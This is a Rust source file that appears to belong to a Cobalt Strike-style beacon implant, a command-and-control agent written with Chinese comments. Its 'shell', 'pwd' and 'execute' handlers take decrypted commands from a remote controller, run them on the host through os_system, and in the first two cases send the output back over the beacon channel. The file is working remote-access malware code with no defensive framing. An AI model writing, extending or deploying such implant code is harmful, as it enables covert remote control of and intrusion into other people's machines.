use std::io::Cursor;

use crate::util::data_parse::{beacon_read_i32, beacon_read_length_and_string, beacon_send_result};
use crate::util::jobs::CALLBACK_OUTPUT;
use crate::util::os_command::os_system;
use crate::BEACON;

pub fn shell(mut decrypted_cursor: Cursor<Vec<u8>>) {
    // <app_len:u32> <app_data>
    // <arg_len:u32> <arg_data>
    let _cmd_len = beacon_read_i32(&mut decrypted_cursor).unwrap();
    let (_, app_path) = beacon_read_length_and_string(&mut decrypted_cursor).unwrap();
    let (_, args) = beacon_read_length_and_string(&mut decrypted_cursor).unwrap();
    // 仅在 debug 模式下打印
    if cfg!(debug_assertions) {
        println!(
            "CMD_TYPE_SHELL: app_path: {:?}",
            String::from_utf8_lossy(&app_path)
        );
        println!("CMD_TYPE_SHELL: args: {:?}", String::from_utf8_lossy(&args));
    }
    // CMD_TYPE_SHELL: app_path: "%COMSPEC%"
    // CMD_TYPE_SHELL: args: " /C ip addr"
    let args = String::from_utf8_lossy(&args);
    let args = args.replace("/C", "");
    let args = args.trim();
    let output = match os_system(&args) {
        Ok(output) => {
            // 仅在 debug 模式下打印
            if cfg!(debug_assertions) {
                // 成功执行命令，处理输出
                println!("Command executed successfully!");
                println!("Output: {:?}", output);
            }
            output
        }
        Err(e) => {
            // 命令执行失败，处理错误
            // 仅在 debug 模式下打印
            if cfg!(debug_assertions) {
                println!("Command failed with error: {}", e);
            }
            String::from("command failed")
        }
    };

    unsafe {
        match beacon_send_result(&output.as_bytes(), &BEACON, CALLBACK_OUTPUT) {
            // Ok(()) => println!("Beacon result sent successfully!"),
            Ok(()) => (),
            Err(e) => eprintln!("Failed to send beacon result: {}", e),
        }
    }
}

pub fn pwd() {
    let output = match os_system("pwd") {
        Ok(output) => {
            // 仅在 debug 模式下打印
            if cfg!(debug_assertions) {
                // 成功执行命令，处理输出
                println!("Command executed successfully!");
                println!("Output: {:?}", output);
            }
            output
        }
        Err(e) => {
            // 仅在 debug 模式下打印
            if cfg!(debug_assertions) {
                // 命令执行失败，处理错误
                println!("Command failed with error: {}", e);
            }
            String::from("command failed")
        }
    };

    unsafe {
        match beacon_send_result(&output.as_bytes(), &BEACON, CALLBACK_OUTPUT) {
            // Ok(()) => println!("Beacon result sent successfully!"),
            Ok(()) => (),
            Err(e) => eprintln!("Failed to send beacon result: {}", e),
        }
    }
}

pub fn execute(mut decrypted_cursor: Cursor<Vec<u8>>) {
    // <app_len:u32> <app_data>

    let (_, args) = beacon_read_length_and_string(&mut decrypted_cursor).unwrap();

    // 仅在 debug 模式下打印
    if cfg!(debug_assertions) {
        println!("CMD_TYPE_SHELL: args: {:?}", String::from_utf8_lossy(&args));
    }
    // CMD_TYPE_SHELL: app_path: "%COMSPEC%"
    // CMD_TYPE_SHELL: args: " /C ip addr"
    let args = String::from_utf8_lossy(&args);
    let args = args.replace("/C", "");
    let args = args.trim();
    let output = match os_system(&args) {
        Ok(output) => {
            // 仅在 debug 模式下打印
            if cfg!(debug_assertions) {
                // 成功执行命令，处理输出
                println!("Command executed successfully!");
                println!("Output: {:?}", output);
            }
            output
        }
        Err(e) => {
            // 仅在 debug 模式下打印
            if cfg!(debug_assertions) {
                // 命令执行失败，处理错误
                println!("Command failed with error: {}", e);
            }
            String::from("command failed")
        }
    };
}
